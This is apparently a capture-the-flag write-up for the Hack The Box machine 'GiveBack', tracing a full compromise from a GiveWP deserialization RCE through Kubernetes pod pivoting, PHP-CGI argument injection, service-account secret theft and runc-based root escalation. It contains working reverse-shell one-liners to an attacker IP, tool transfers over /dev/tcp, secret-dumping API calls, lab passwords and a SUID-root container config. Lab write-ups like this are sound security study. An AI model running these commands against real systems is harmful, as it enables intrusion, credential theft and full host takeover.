---
icon: arrow-left-to-arc
cover: ../../../../.gitbook/assets/Screenshot 2026-02-22 134448.png
coverY: -3.1383061032138286
---

# HTB-GIVEBACK

### Reconnaissance

#### Hosts Setup

```bash
┌──(sn0x㉿sn0x)-[~/HTB/GiveBack]
└─$ echo "10.10.11.94 giveback.htb" | sudo tee -a /etc/hosts
```

#### Port Scan -RustScan

```bash
┌──(sn0x㉿sn0x)-[~/HTB/GiveBack]
└─$ rustscan -a 10.10.11.94 BLAH BLAH BLAH
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 66:f8:9c:58:f4:b8:59:bd:cd:ec:92:24:c3:97:8e:9e (ECDSA)
|_  256 96:31:8a:82:1a:65:9f:0a:a2:6c:ff:4d:44:7c:d3:94 (ED25519)
80/tcp open  http    nginx 1.28.0
|_http-server-header: nginx/1.28.0
|_http-generator: WordPress 6.8.1
|_http-title: GIVING BACK IS WHAT MATTERS MOST - OBVI
```

Two ports open: SSH on 22 and a WordPress site on 80. The generator header immediately tells us this is WordPress 6.8.1 running behind nginx 1.28.0.

#### WordPress Fingerprinting WPProbe

Two scanners were tested across different approaches. WPProbe gives a cleaner output for plugin vulnerability enumeration:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/GiveBack]
└─$ wpprobe scan -u http://giveback.htb
```

The scan reveals the **GiveWP plugin version 3.14.0** is installed. This version is vulnerable to **CVE-2024-5932**, a critical unauthenticated RCE. The site is also backed by a MariaDB/MySQL database.

Alternatively, wpscan can be used for a broader sweep:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/GiveBack]
└─$ wpscan --url http://giveback.htb --enumerate p,u --plugins-detection aggressive
```

Both approaches confirm the GiveWP plugin as the attack surface.

***

#### Vulnerability Overview

CVE-2024-5932 is a **critical PHP Object Injection (POI)** vulnerability in the GiveWP plugin (Donation Plugin and Fundraising Platform) affecting versions up to and including 3.14.1, fixed in 3.14.2.

**Bug Class:** Unsafe deserialization of attacker-controlled input in the `give_title` field.

The vulnerable code path lives in `class-give-payment.php`:

```php
switch ( $key ) {
    case 'title':
        $user_info[ $key ] = Give()->donor_meta->get_meta( $donor->id, '_give_donor_title_prefix', true );
        break;
}
```

The `get_meta()` call with the `true` flag passes through WordPress's `maybe_unserialize()` — a full deserialization sink on attacker-controlled data. Since the plugin bundles third-party classes like `Stripe\StripeObject` and `TCPDF`, a POP (Property-Oriented Programming) chain can be assembled to reach `call_user_func('shell_exec', $cmd)`.

#### Identify the Donation Form URL

Navigate to `http://giveback.htb` and find the donation form. The target URL for the exploit is:

```
http://giveback.htb/donations/the-things-we-need/
```

#### Setup the Exploit

```bash
┌──(sn0x㉿sn0x)-[~/HTB/GiveBack]
└─$ git clone https://github.com/EQSTLab/CVE-2024-5932.git
└─$ cd CVE-2024-5932
└─$ python -m venv .venv && source .venv/bin/activate
└─$ pip install -r requirements.txt
```

#### Start a Listener

```bash
┌──(sn0x㉿sn0x)-[~/HTB/GiveBack]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

#### Fire the Exploit

```bash
┌──(sn0x㉿sn0x)-[~/HTB/GiveBack/CVE-2024-5932]
└─$ python3 CVE-2024-5932-rce.py \
    -u http://giveback.htb/donations/the-things-we-need/ \
    -c "bash -c 'bash -i >& /dev/tcp/10.10.15.78/4444 0>&1'"
```

#### Shell Received

```
connect to [10.10.15.78] from (UNKNOWN) [10.10.11.94] 25212
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
<wordpress-pod>:/opt/bitnami/wordpress/wp-admin$ id
uid=1001 gid=0(root) groups=0(root),1001
```

We have a shell as uid=1001 inside a Kubernetes pod. This is not the host machine yet.

***

### Inside the Kubernetes Pod

#### Basic Enumeration

```bash
hostname
# beta-vino-wp-wordpress-9c558b85d-hmnlk

ip a
# eth0: 10.42.1.198/24
```

We are inside a Kubernetes pod on the pod network `10.42.x.x`. The Kubernetes service network is `10.43.0.0/16`.

#### Environment Variables — Credential Dump

This is the most valuable first step inside any K8s pod:

```bash
env
```

```
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_PORT=443
WORDPRESS_DATABASE_HOST=beta-vino-wp-mariadb
MARIADB_PORT_NUMBER=3306
HOSTNAME=beta-vino-wp-wordpress-9c558b85d-hmnlk
LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
LEGACY_INTRANET_SERVICE_SERVICE_PORT_HTTP=5000
WORDPRESS_DATABASE_NAME=bitnami_wordpress
WORDPRESS_DATABASE_USER=bn_wordpress
WORDPRESS_DATABASE_PASSWORD=sW5sp4spa3u7RLyetrekE4oS
WORDPRESS_USERNAME=user
WORDPRESS_PASSWORD=O8F7KR5zGi
BETA_VINO_WP_MARIADB_SERVICE_HOST=10.43.147.82
KUBERNETES_SERVICE_HOST=10.43.0.1
```

Key findings from env:

| Item              | Value                    |
| ----------------- | ------------------------ |
| DB Host           | beta-vino-wp-mariadb     |
| DB User           | bn\_wordpress            |
| DB Password       | sW5sp4spa3u7RLyetrekE4oS |
| WP Admin Password | O8F7KR5zGi               |
| Internal Service  | 10.43.2.241:5000         |
| K8s API           | 10.43.0.1:443            |

The `LEGACY_INTRANET_SERVICE_SERVICE_HOST` and port are a critical pivot point — there is an internal service at `10.43.2.241:5000` that Kubernetes has injected into the pod's environment.

#### Check for ServiceAccount Token

```bash
ls -l /var/run/secrets/kubernetes.io/serviceaccount/
# Error: No such file or directory
```

This WordPress pod has no ServiceAccount token mounted — it is sandboxed. Anonymous API access is also denied:

```bash
curl -sk https://10.43.0.1/version
# {"kind":"Status",...,"reason":"Unauthorized","code":401}
```

No token, no anonymous access — we cannot query the K8s API from here. We need to pivot.

#### Database Enumeration (Optional Path)

Since we have DB credentials, we can dump WordPress users directly:

```bash
mysql -h beta-vino-wp-mariadb -u bn_wordpress -p'sW5sp4spa3u7RLyetrekE4oS' bitnami_wordpress \
  -e "SELECT ID,user_login,user_email,user_pass FROM wp_users;"
```

```
ID    user_login    user_email           user_pass
1     user          user@example.com     $P$Bm1D6gJHKylnyyTeT0oYNGKpib//vP.
```

The phpass hash can be attempted with hashcat:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/GiveBack]
└─$ hashcat -m 400 -a 0 hashes.txt ~/wordlists/rockyou.txt
```

```
Status: Exhausted
```

Not crackable with rockyou. This path is a dead end — we move to the internal service instead.

#### CDK  Kubernetes Container Recon Tool

CDK is a post-exploitation framework designed for containerized environments. Build it on the attacker machine and transfer it:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/GiveBack]
└─$ git clone https://github.com/cdk-team/CDK
└─$ cd CDK
└─$ CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -trimpath -ldflags "-s -w" -o cdk ./cmd/cdk
```

Transfer to the pod using raw TCP (no curl/wget may be available):

```bash
# On attacker
┌──(sn0x㉿sn0x)-[~/HTB/GiveBack]
└─$ nc -lvp 12345 < cdk

# On pod
cd /tmp
cat < /dev/tcp/10.10.15.78/12345 > cdk
chmod +x cdk
```

Run the evaluation:

```bash
./cdk evaluate
```

```
[Information Gathering - Services]
sensitive env found: KUBERNETES_SERVICE_HOST=10.43.0.1

[Information Gathering - Commands and Capabilities]
available commands: find,ps,php,apt,dpkg,httpd,mysql,mount,base64,perl
CapEff: 0000000000000000

[Discovery - K8s API Server]
api-server forbids anonymous request.

[Discovery - K8s Service Account]
open /var/run/secrets/kubernetes.io/serviceaccount/token: no such file or directory
```

Scan the internal subnet for open ports:

```bash
./cdk probe 10.42.1.0-255 1-65535 100 500
```

```
open : 10.42.1.0:22
open : 10.42.1.0:6443
open : 10.42.1.0:10250
open : 10.42.1.184:5000
open : 10.42.1.186:5000
open : 10.42.1.187:5000
open : 10.42.1.190:8080
open : 10.42.1.193:5000
open : 10.42.1.195:5000
open : 10.42.1.198:8080
open : 10.42.1.199:8080
```

Multiple pods are listening on port 5000. This matches the `LEGACY_INTRANET_SERVICE_SERVICE_HOST` we found in the environment. Port 6443 confirms the K8s API server is reachable at the node level, and 10250 is the Kubelet API.

***

### Network Pivoting

We need to browse internal services at `10.42.1.x:5000` and `10.43.2.241:5000` from our attacker machine. Two tunneling approaches were used across writeups — both are documented here.

#### Method A — Chisel (SOCKS Proxy)

Chisel is the simplest for browser-based access through proxychains.

**Transfer chisel to the pod:**

```bash
# Attacker machine — serve chisel
┌──(sn0x㉿sn0x)-[~/HTB/GiveBack]
└─$ python3 -m http.server 8080

# On pod — download via PHP (since curl may not be available)
php -r "file_put_contents('/tmp/chisel', file_get_contents('http://10.10.15.78:8080/chisel'));"
chmod +x /tmp/chisel
```

**Start server on attacker:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/GiveBack]
└─$ chisel server -p 8001 --reverse
```

**Start client on pod:**

```bash
/tmp/chisel client 10.10.15.78:8001 R:socks
```

```
client: Connecting to ws://10.10.15.78:8001
client: Connected (Latency 45ms)
```

**Configure proxychains** (`/etc/proxychains4.conf`):

```
[ProxyList]
socks5 127.0.0.1 1080
```

**Test access:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/GiveBack]
└─$ proxychains curl http://10.43.2.241:5000/
```

<figure><img src="../../../../.gitbook/assets/image (583).png" alt=""><figcaption></figcaption></figure>

#### Method B - ligolo-ng (Full Tunnel)

Ligolo-ng provides a full transparent tunnel — cleaner for multi-target pivoting.

**Transfer the agent:**

```bash
# Attacker
┌──(sn0x㉿sn0x)-[~/HTB/GiveBack]
└─$ nc -lvp 12345 < ligolo-agent

# Pod
cat < /dev/tcp/10.10.15.78/12345 > agent
chmod +x agent
./agent -connect 10.10.15.78:11601 -ignore-cert &
```

**On attacker, start the proxy and add the route:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/GiveBack]
└─$ ligolo-proxy -selfcert
# Once agent connects:
[ligolo]> session
[ligolo]> tunnel_start
```

```bash
sudo ip route add 10.42.0.0/16 dev ligolo
sudo ip route add 10.43.0.0/16 dev ligolo
```

After the tunnel is up, `http://10.42.1.184:5000` is directly accessible in the browser without proxychains.

***

### Second RCE  PHP-CGI Argument Injection (CVE-2012-1823)

#### Discovering the Internal Service

Browsing to `http://10.43.2.241:5000` (or any of the `10.42.1.x:5000` hosts) reveals:

```
GiveBack LLC Internal CMS System
Development Environment - Internal Use Only

Legacy Notice:
SRE - This system still includes legacy CGI support.
Cluster misconfiguration may likely expose internal scripts.

Internal Resources:
/cgi-bin/info   - CGI diagnostics
/cgi-bin/php-cgi - PHP-CGI Handler
```

The developer notes mention Windows + IIS running `php-cgi.exe` — legacy scripts retained. The `/cgi-bin/php-cgi` endpoint is the jackpot.

#### Vulnerability — PHP-CGI Argument Injection

CVE-2012-1823 allows injecting PHP CLI flags through the query string when `php-cgi` is used. By passing:

```
?-d+allow_url_include=1+-d+auto_prepend_file=php://input
```

...PHP reads its ini settings from the query string and executes the POST body as PHP code. This is a decades-old vulnerability that occasionally surfaces on legacy infrastructure.

Some variants of the patched version check the query string for a `=` sign. If it starts without one, it treats the query string as CLI arguments. A soft hyphen character (`%AD`) can be used to bypass certain filters in place of the standard `-`:

```
?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
```

#### Method A - From Inside the Pod (No Tunnel Needed)

Since PHP is available in the WordPress pod and the internal service is reachable directly, we can trigger the exploit from within the pod itself:

**Start a listener on attacker:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/GiveBack]
└─$ nc -lvnp 60002
```

**Fire from inside the WordPress pod:**

```bash
php -r "\$c=stream_context_create(['http'=>['method'=>'POST','content'=>'busybox nc 10.10.15.78 60002 -e /bin/sh']]); echo file_get_contents('http://10.42.1.184:5000/cgi-bin/php-cgi?-d+allow_url_include=1+-d+auto_prepend_file=php://input',0,\$c);"
```

Alternate target (ClusterIP service, same effect):

```bash
php -r "\$c=stream_context_create(['http'=>['method'=>'POST','content'=>'busybox nc 10.10.15.78 60002 -e /bin/sh']]); echo file_get_contents('http://10.43.2.241:5000/cgi-bin/php-cgi?-d+allow_url_include=1+-d+auto_prepend_file=php://input',0,\$c);"
```

#### Method B — From Attacker via Proxychains (Chisel Tunnel)

```bash
┌──(sn0x㉿sn0x)-[~/HTB/GiveBack]
└─$ nc -lvnp 5656

┌──(sn0x㉿sn0x)-[~/HTB/GiveBack]
└─$ proxychains php -r '$u="http://10.43.2.241:5000/cgi-bin/php-cgi?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input"; $d="nc 10.10.15.78 5656 -e sh"; $ctx=stream_context_create(["http"=>["method"=>"POST","content"=>$d]]); echo file_get_contents($u,false,$ctx);'
```

#### Shell on the CGI Pod

```
connect to [10.10.15.78] from (UNKNOWN) [10.42.1.184] 38412
# id
uid=0(root) gid=0(root) groups=0(root)
```

This pod runs as root. More importantly, it has a ServiceAccount token mounted — something the WordPress pod lacked.

***

### Kubernetes Secret Extraction

#### Confirm the ServiceAccount Token Exists

```bash
ls -l /var/run/secrets/kubernetes.io/serviceaccount/
```

```
total 0
lrwxrwxrwx 1 root root 13 Nov 2 09:50 ca.crt -> ..data/ca.crt
lrwxrwxrwx 1 root root 16 Nov 2 09:50 namespace -> ..data/namespace
lrwxrwxrwx 1 root root 12 Nov 2 09:50 token -> ..data/token
```

#### Verify API Access

```bash
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
API="https://kubernetes.default.svc"

curl -ks --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" "$API/version"
```

```json
{
  "major": "1",
  "minor": "31",
  "gitVersion": "v1.31.2+k3s1",
  ...
}
```

The ServiceAccount has API access. Dump all secrets in the default namespace:

```bash
curl -ks --cacert "$CACERT" \
  -H "Authorization: Bearer $TOKEN" \
  "$API/api/v1/namespaces/$NS/secrets" > /tmp/secret
```

#### Extract Credentials from Secrets

```bash
grep -i 'pass\|MASTER' /tmp/secret
```

```
"mariadb-password": "c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T",
"mariadb-root-password": "c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw==",
"wordpress-password": "TzhGN0tSNXpHaQ==",
"MASTERPASS": "TktzSTFUMkw2Qk9jMEFpRk1JbG1aV2VHeXBqSUNwUnQ="
```

The `MASTERPASS` key stands out — it belongs to a secret named `user-secret-babywyrm`. Identify this with:

```bash
jq -r '.items[] | select(.data.MASTERPASS) | .metadata.name' /tmp/secret
```

```
user-secret-babywyrm
```

Decode the relevant secrets:

```bash
# MariaDB root password
echo -n "c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw==" | base64 -d
# sW5sp4syetre32828383kE4oS

# MASTERPASS — belongs to user babywyrm
echo -n 'TktzSTFUMkw2Qk9jMEFpRk1JbG1aV2VHeXBqSUNwUnQ=' | base64 -d
# NKsI1T2L6BOc0AiFMIlmZWeGypjICpRt
```

The admin password for `/opt/debug` (found later) is the base64 string itself — the mariadb-password value:

```bash
echo -n "c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T" | base64 -d
# sW5sp4spa3u7RLyetrekE4oS
```

***

### &#x20;SSH Access — User Flag

We have a username (`babywyrm` from the secret name) and the `MASTERPASS` value. Try SSH:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/GiveBack]
└─$ ssh babywyrm@10.10.11.94
```

Password: `NKsI1T2L6BOc0AiFMIlmZWeGypjICpRt`

```
babywyrm@giveback:~$ id
uid=1001(babywyrm) gid=1001(babywyrm) groups=1001(babywyrm)

babywyrm@giveback:~$ cat user.txt
[user flag]
```

***

### &#x20;Privilege Escalation via runc

#### Check Sudo Permissions

```bash
babywyrm@giveback:~$ sudo -l
```

```
Matching Defaults entries for babywyrm on localhost:
    env_reset, mail_badpass, secure_path=..., use_pty, timestamp_timeout=20

User babywyrm may run the following commands on localhost:
    (ALL) NOPASSWD: !ALL
    (ALL) /opt/debug
```

`!ALL` means everything is denied except the explicitly listed binary. Only `/opt/debug` is allowed.

```bash
babywyrm@giveback:~$ ls -l /opt/debug
-rwx------ 1 root root 1037 Nov 22 2024 /opt/debug
```

No read access — black box binary. Running it:

```bash
babywyrm@giveback:~$ sudo /opt/debug
Validating sudo...
Please enter the administrative password:
```

The binary expects a password. Several values were tested. The one that works is the `mariadb-password` base64 string as the literal password (not the decoded value):

```
Password: c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T
```

```
Both passwords verified. Executing the command...
NAME:
   runc - Open Container Initiative runtime
VERSION:
   1.1.11
```

`/opt/debug` is a wrapper around `runc` v1.1.11 running as root via sudo. This is the entire privilege escalation surface — runc can spin up an OCI container with arbitrary mounts and as root.

#### Method A — SUID Bash (Persistent Root)

This method creates a SUID root bash binary on the host, giving an interactive root shell.

```bash
babywyrm@giveback:~$ mkdir -p /tmp/a/rootfs && cd /tmp/a
babywyrm@giveback:/tmp/a$ sudo /opt/debug spec
```

Enter password when prompted: `c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T`

Now edit `config.json` using `jq` to bind-mount the host filesystem and create a SUID bash:

```bash
babywyrm@giveback:/tmp/a$ jq --arg t /usr/local/bin/bp \
  '.root.path="/tmp/a/rootfs"
   | .hostname=""
   | .process.terminal=false
   | .process.args=["/bin/sh","-c","cp /host/bin/bash \($t) && chown root:root \($t) && chmod 4755 \($t)"]
   | .process.noNewPrivileges=false
   | .linux.namespaces=[{"type":"mount"}]
   | .linux.seccomp=null
   | .linux.maskedPaths=[]
   | .linux.readonlyPaths=[]
   | .mounts=[
       {"destination":"/host","type":"bind","source":"/","options":["rbind","rw"]},
       {"destination":"/bin","type":"bind","source":"/bin","options":["rbind","rw"]},
       {"destination":"/lib","type":"bind","source":"/lib","options":["rbind","rw"]},
       {"destination":"/lib64","type":"bind","source":"/lib64","options":["rbind","rw"]},
       {"destination":"/usr","type":"bind","source":"/usr","options":["rbind","rw"]},
       {"destination":"/etc","type":"bind","source":"/etc","options":["rbind","rw"]},
       {"destination":"/dev","type":"bind","source":"/dev","options":["rbind","rw"]},
       {"destination":"/proc","type":"proc","source":"proc","options":["nosuid","noexec","nodev"]}
     ]' config.json > cfg && mv cfg config.json
```

Run the container:

```bash
babywyrm@giveback:/tmp/a$ sudo /opt/debug run -b /tmp/a rootbox
```

Enter password: `c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T`

The container executes, copies bash to `/usr/local/bin/bp`, and sets the SUID bit on the host. Now:

```bash
babywyrm@giveback:/tmp/a$ /usr/local/bin/bp -p
bp-5.1# id
uid=1001(babywyrm) gid=1001(babywyrm) euid=0(root) egid=0(root)
bp-5.1# whoami
root
```

#### Method B — Direct Root Flag Read (Minimal Config)

A simpler approach that reads the root flag directly without needing a persistent shell:

```bash
babywyrm@giveback:~$ mkdir -p ~/readflag/rootfs && cd ~/readflag

babywyrm@giveback:~/readflag$ cat > config.json << 'EOF'
{
  "ociVersion": "1.0.2",
  "process": {
    "user": {"uid": 0, "gid": 0},
    "args": ["/bin/cat", "/root/root.txt"],
    "cwd": "/",
    "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
    "terminal": false
  },
  "root": {"path": "rootfs"},
  "mounts": [
    {"destination": "/proc", "type": "proc", "source": "proc"},
    {"destination": "/dev", "type": "tmpfs", "source": "tmpfs", "options": ["nosuid","strictatime","mode=755","size=65536k"]},
    {"destination": "/bin", "type": "bind", "source": "/bin", "options": ["bind","ro"]},
    {"destination": "/lib", "type": "bind", "source": "/lib", "options": ["bind","ro"]},
    {"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["bind","ro"]},
    {"destination": "/root", "type": "bind", "source": "/root", "options": ["bind","ro"]},
    {"destination": "/usr", "type": "bind", "source": "/usr", "options": ["bind","ro"]}
  ],
  "linux": {
    "namespaces": [
      {"type": "pid"},
      {"type": "network"},
      {"type": "ipc"},
      {"type": "uts"},
      {"type": "mount"}
    ]
  }
}
EOF

babywyrm@giveback:~/readflag$ sudo /opt/debug run getflag
```

Enter password: `c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T`

***

### Root Flag

```
[root flag printed directly to stdout]
```

Both methods achieve the same result. Method A gives an interactive root shell; Method B is a one-shot flag read.

***

### Attack Flow

```
[External] HTTP Port 80
       |
       v
WordPress GiveWP Plugin v3.14.0
CVE-2024-5932 — PHP Object Injection -> RCE
       |
       v
WordPress Pod Shell (uid=1001, no SA token)
       |
       +-- env vars -> credentials + internal service discovery
       |
       v
Internal Service: 10.43.2.241:5000 / 10.42.1.184:5000
CVE-2012-1823 — PHP-CGI Argument Injection -> RCE
       |
       v
CGI Pod Shell (root, ServiceAccount token mounted)
       |
       v
Kubernetes API -> List Secrets -> MASTERPASS for babywyrm
       |
       v
SSH as babywyrm (user flag)
       |
       v
sudo /opt/debug (runc v1.1.11 as root)
OCI Container with host bind mounts -> SUID bash / direct flag read
       |
       v
ROOT
```

The WordPress pod had no ServiceAccount token but it leaked everything via environment variables, including the internal service endpoint. The internal CGI pod was an entirely separate workload with an overprivileged ServiceAccount that could read all secrets in the default namespace. Secrets for different services were stored in the same namespace with no RBAC isolation. The sudo binary `/opt/debug` was runc disguised with a password check but once authenticated, it provided full OCI container control as root with no seccomp, no namespace restrictions, and direct access to the host filesystem through bind mounts.

<figure><img src="../../../../.gitbook/assets/complete (37).gif" alt=""><figcaption></figcaption></figure>
